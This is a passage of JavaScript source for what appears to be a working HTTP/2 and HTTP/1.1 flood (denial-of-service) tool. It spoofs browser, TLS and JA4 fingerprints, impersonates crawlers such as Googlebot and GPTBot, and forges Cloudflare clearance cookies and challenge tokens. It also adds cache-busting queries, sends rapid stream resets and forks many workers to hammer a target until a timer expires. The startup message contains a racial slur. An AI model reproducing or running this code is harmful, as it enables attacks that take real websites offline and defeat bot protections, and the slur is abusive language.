    const signatureAlgorithms = ["1027", "2052", "1025", "1283", "2053", "1281", "2054", "1537"];

    // ===== GENERATE CONFIGURATION =====
    let screen, gpu, os, hardware, userAgentBase;
    const chromeVersion = getRandomInt(128, 133);
    const langConfig = languages[Math.floor(Math.random() * languages.length)];

    if (platform === 'mobile') {
        screen = mobileScreens[Math.floor(Math.random() * mobileScreens.length)];
        gpu = mobileGPUs[Math.floor(Math.random() * mobileGPUs.length)];
        hardware = gpu.hw[Math.floor(Math.random() * gpu.hw.length)];

        if (gpu.vendor === "Apple Inc.") {
            os = "iOS";
            userAgentBase = `Mozilla/5.0 (iPhone; CPU iPhone OS 17_${getRandomInt(0,4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.${getRandomInt(0,4)} Mobile/15E148 Safari/604.1`;
        } else {
            os = "Android";
            userAgentBase = `Mozilla/5.0 (Linux; Android ${getRandomInt(13,15)}; ${screen.device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Mobile Safari/537.36`;
        }
    } else {
        screen = desktopScreens[Math.floor(Math.random() * desktopScreens.length)];
        const osChoice = Math.random();

        if (osChoice < 0.7) { // 70% Windows
            os = "Windows";
            gpu = desktopGPUs.windows[Math.floor(Math.random() * desktopGPUs.windows.length)];
            hardware = gpu.hw[Math.floor(Math.random() * gpu.hw.length)];
            userAgentBase = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
        } else if (osChoice < 0.85) { // 15% macOS
            os = "macOS";
            gpu = desktopGPUs.mac[Math.floor(Math.random() * desktopGPUs.mac.length)];
            hardware = gpu.hw[Math.floor(Math.random() * gpu.hw.length)];
            userAgentBase = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
        } else { // 15% Linux
            os = "Linux";
            gpu = desktopGPUs.linux[Math.floor(Math.random() * desktopGPUs.linux.length)];
            hardware = gpu.hw[Math.floor(Math.random() * gpu.hw.length)];
            userAgentBase = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
        }
    }

    // ===== BOT USER AGENTS =====
    const botUserAgents = [
        `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${chromeVersion}.0.0.0 Safari/537.36`,
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'GPTBot/1.1 (+https://openai.com/gptbot)',
        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'
    ];

    const userAgent = fakeBot
        ? botUserAgents[Math.floor(Math.random() * botUserAgents.length)]
        : userAgentBase;

    // ===== GENERATE FINGERPRINTS =====
    const canvasSeed = userAgent + gpu.renderer + screen.width + screen.height;
    const canvasFingerprint = canvasSeed.split('').reduce((a, b) => {
        a = ((a << 5) - a) + b.charCodeAt(0);
        return a & a;
    }, 0).toString(16).substring(0, 8);

    const webglFingerprint = (gpu.vendor + gpu.renderer).split('').reduce((a, b) => {
        a = ((a << 5) - a) + b.charCodeAt(0);
        return a & a;
    }, 0).toString(16).substring(0, 8);

    // ===== JA4 FINGERPRINT (2026 STANDARD) =====
    // Format: t13d{cipherCount}{extensionCount}_{cipherHash}_{extensionHash}
    const selectedCiphers = tlsCipherSuites.slice(0, getRandomInt(8, 12));
    const selectedExtensions = tlsExtensions.slice(0, getRandomInt(12, 16)).sort((a, b) => parseInt(a) - parseInt(b));

    const cipherHash = selectedCiphers.join(',').split('').reduce((a, b) => {
        a = ((a << 5) - a) + b.charCodeAt(0);
        return a & a;
    }, 0).toString(16).substring(0, 12);

    const extensionHash = selectedExtensions.join('-').split('').reduce((a, b) => {
        a = ((a << 5) - a) + b.charCodeAt(0);
        return a & a;
    }, 0).toString(16).substring(0, 12);

    const ja4 = `t13d${selectedCiphers.length.toString().padStart(2, '0')}${selectedExtensions.length.toString().padStart(2, '0')}_${cipherHash}_${extensionHash}`;

    // ===== RETURN FINGERPRINT OBJECT =====
    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height - (platform === 'mobile' ? 0 : 40),
            colorDepth: 24,
            pixelDepth: 24,
            pixelRatio: screen.ratio || 1
        },
        navigator: {
            language: langConfig.lang.split(',')[0],
            languages: langConfig.lang.split(',').map(l => l.split(';')[0]),
            doNotTrack: null, // Modern browsers report null, not "1"
            hardwareConcurrency: hardware,
            userAgent: userAgent,
            platform: os === "macOS" ? "MacIntel" : (os === "Windows" ? "Win32" : "Linux x86_64"),
            vendor: os === "macOS" || platform === 'mobile' && os === "iOS" ? "Apple Computer, Inc." : "Google Inc.",
            userAgentData: {
                brands: fakeBot
                    ? [{"brand": "Not A;Brand", "version": "99"}, {"brand": "Chromium", "version": chromeVersion.toString()}]
                    : [{"brand": "Google Chrome", "version": chromeVersion.toString()}, {"brand": "Chromium", "version": chromeVersion.toString()}, {"brand": "Not-A.Brand", "version": "24"}],
                mobile: platform === 'mobile',
                platform: os === "Windows" ? "Windows" : (os === "macOS" ? "macOS" : os)
            },
            deviceMemory: hardware,
            maxTouchPoints: platform === 'mobile' ? getRandomInt(5, 10) : 0,
            webdriver: false,
            cookieEnabled: true,
            pdfViewerEnabled: !fakeBot
        },
        plugins: fakeBot ? [] : [
            { name: "PDF Viewer", filename: "internal-pdf-viewer" },
            { name: "Chrome PDF Viewer", filename: "internal-pdf-viewer" },
            { name: "Chromium PDF Viewer", filename: "internal-pdf-viewer" },
            { name: "Microsoft Edge PDF Viewer", filename: "internal-pdf-viewer" },
            { name: "WebKit built-in PDF", filename: "internal-pdf-viewer" }
        ],
        timezone: langConfig.tz,
        timezoneString: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
        webgl: {
            vendor: gpu.vendor,
            renderer: gpu.renderer,
            fingerprint: webglFingerprint,
            unmaskedVendor: gpu.vendor,
            unmaskedRenderer: gpu.renderer
        },
        canvas: canvasFingerprint,
        audio: (Math.random() * 0.00001).toFixed(10),
        fonts: platform === 'mobile' ? 45 + getRandomInt(-5, 5) : 78 + getRandomInt(-10, 10),
        localStorage: true,
        sessionStorage: true,
        indexedDB: true,
        openDatabase: false,
        cpuClass: undefined,
        ja4: ja4,
        ja4_raw: {
            tls_version: "1.3",
            ciphers: selectedCiphers,
            extensions: selectedExtensions,
            signature_algorithms: signatureAlgorithms.slice(0, 6)
        },
        touchSupport: {
            maxTouchPoints: platform === 'mobile' ? getRandomInt(5, 10) : 0,
            touchEvent: platform === 'mobile',
            touchStart: platform === 'mobile'
        },
        media: {
            audioCodecs: ["audio/mp4; codecs=\"mp4a.40.2\"", "audio/webm; codecs=\"opus\""],
            videoCodecs: ["video/mp4; codecs=\"avc1.42E01E\"", "video/webm; codecs=\"vp9\""],
        },
        webrtc: {
            browserLeakProtection: Math.random() > 0.5,
            publicIP: null
        },
        platform: platform,
        os: os,
        consistent: true // Internal flag indicating this is a validated consistent fingerprint
    };
}

const fingerprint = generateBrowserFingerprint();
function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);

    return `${coloredStatus}: ${underlinedCount}`;
}

function go() {
    let tlsSocket;

    const netSocket = net.connect({
        host: url.hostname,
        port: 443,
        keepAlive: true,
        keepAliveMsecs: 10000
    }, () => {
        rawConnections++;

        tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: ['h2', 'http/1.1'],
            servername: url.host,
            ciphers: ja3Fingerprint.ciphers.join(':'),
            sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
            secureOptions:
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1 |
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE,
            secure: true,
            session: crypto.randomBytes(64),
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: ja3Fingerprint.curves.join(':'),
            supportedVersions: ['TLSv1.3', 'TLSv1.2'],
            supportedGroups: ja3Fingerprint.curves.join(':'),
            applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
            rejectUnauthorized: false,
            fingerprint: fingerprint,
            keepAlive: true,
            keepAliveMsecs: 10000
        }, () => {
            if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                if (forceHttp == 2) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                function main() {
                    const method = enableCache ? getRandomMethod() : reqmethod;
                    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                    const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost[](https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
                    tlsSocket.write(h1payl, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                main();
                            }, isFull ? 300 : 300 / ratelimit);
                        } else {
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                main();

                tlsSocket.on('error', () => {
                    tlsSocket.end(() => tlsSocket.destroy());
                });
                return;
            }

            if (forceHttp == 1) {
                tlsSocket.end(() => tlsSocket.destroy());
                return;
            }

            let streamId = 1;
            let data = Buffer.alloc(0);
            let hpack = new HPACK();
            hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

            const updateWindow = Buffer.alloc(4);
            updateWindow.writeUInt32BE(custom_update, 0);
            const frames1 = [];
            const frames = [
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, encodeSettings([
                    [1, http2Fingerprint.HEADER_TABLE_SIZE],
                    [2, http2Fingerprint.ENABLE_PUSH],
                    [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                    [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                    [5, http2Fingerprint.MAX_FRAME_SIZE],
                    [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                    [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                ])),
                encodeFrame(0, 8, updateWindow)
            ];
            frames1.push(...frames);

            tlsSocket.on('data', (eventData) => {
                data = Buffer.concat([data, eventData]);

                while (data.length >= 9) {
                    const frame = decodeFrame(data);
                    if (frame != null) {
                        data = data.subarray(frame.length + 9);
                        if (frame.type == 4 && frame.flags == 0) {
                            tlsSocket.write(encodeFrame(0, 4, "", 1));
                        }
                        if (frame.type == 1) {
                            const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                            if (status == 403 || status == 400) {
                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                                netSocket.end(() => netSocket.destroy());
                            }
                            if (!statuses[status])
                                statuses[status] = 0;

                            statuses[status]++;
                        }

                        if (frame.type == 7 || frame.type == 5) {
                            if (frame.type == 7) {
                                if (debugMode) {
                                    if (!statuses['GOAWAY'])
                                        statuses['GOAWAY'] = 0;

                                    statuses['GOAWAY']++;
                                }
                            }

                            tlsSocket.write(encodeRstStream(0));
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    } else {
                        break;
                    }
                }
            });

            tlsSocket.write(Buffer.concat(frames1));

            function main() {
                if (tlsSocket.destroyed) {
                    return;
                }
                const requests = [];
                let localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : process.argv[6];
                const startTime = Date.now();
                const customHeadersArray = [];
                if (customHeaders) {
                    customHeaders.split('#').forEach(header => {
                        const [name, value] = header.split(':').map(part => part?.trim());
                        if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                    });
                }

                for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
                    let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
                    const method = enableCache ? getRandomMethod() : reqmethod;
                    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                    const pseudoHeaders = [
                        [":method", method],
                        [":authority", url.hostname],
                        [":scheme", "https"],
                        [":path", path],
                    ];

                    const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
                    const additionalRegularHeaders = Object.entries({
                        ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
                        ...(Math.random() > 0.4 && { "dnt": "1" }),
                        ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                    }).filter(a => a[1] != null);

                    const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
                    shuffle(allRegularHeaders);

                    const combinedHeaders = [
                        ...pseudoHeaders,
                        ...allRegularHeaders,
                        ['cookie', generateCfClearanceCookie()],
                        ...generateChallengeHeaders(),
                        ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
                    ];

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(combinedHeaders)
                    ]);
                    const flags = 0x1 | 0x4 | 0x8 | 0x20;
                    const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                    const frame = Buffer.concat([encodedFrame]);
                    if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                        const rstStreamFrame = encodeRstStream(streamId, 8);
                        tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                        STREAMID_RESET = 0;
                    }

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 4;
                }

                tlsSocket.write(Buffer.concat(requests), (err) => {
                    if (err) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }
                    const elapsed = Date.now() - startTime;
                    const delay = Math.max(50, (150 / localRatelimit) - elapsed);
                    setTimeout(() => main(), delay);
                });
            }
            main();
        }).on('error', () => {
            tlsSocket.destroy();
        });

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });

    netSocket.on('close', () => {
        cleanup();
    });

    function cleanup(error) {
        if (error) {
            setTimeout(go, getRandomInt(50, 200));
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}

function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return url.pathname;
}

function generateCacheQuery() {
    const cacheBypassQueries = [
        `?v=${Math.floor(Math.random() * 1000000)}`,
        `?_=${Date.now()}`,
        `?cachebypass=${randstr(8)}`,
        `?ts=${Date.now()}_${randstr(4)}`,
        `?cb=${crypto.randomBytes(4).toString('hex')}`,
        `?rnd=${generateRandomString(5, 10)}`,
        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`,
        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`,
        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`,
        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`,
        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;

        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`BUM BUM HTTPS-FROZEN SENT TO NIGGA TARGET`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let totalConnections = 0;
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (code !== 'rawConnections') {
                                if (statuses[code] == null)
                                    statuses[code] = 0;
                                statuses[code] += st[code];
                            }
                        }
                        totalConnections += st.rawConnections || 0;
                    }
                }
            }
            const statusString = Object.entries(statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            console.clear();
            console.log(`[${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Codes: [${statusString}]`);
            rawConnections = 0;
        }, 1000);
    }

    setInterval(() => {
    }, 1100);

    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 50000) {
                consssas++;
            } else {
                clearInterval(someee);
                return;
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push({ ...statuses, rawConnections });
            statuses = {};
            rawConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
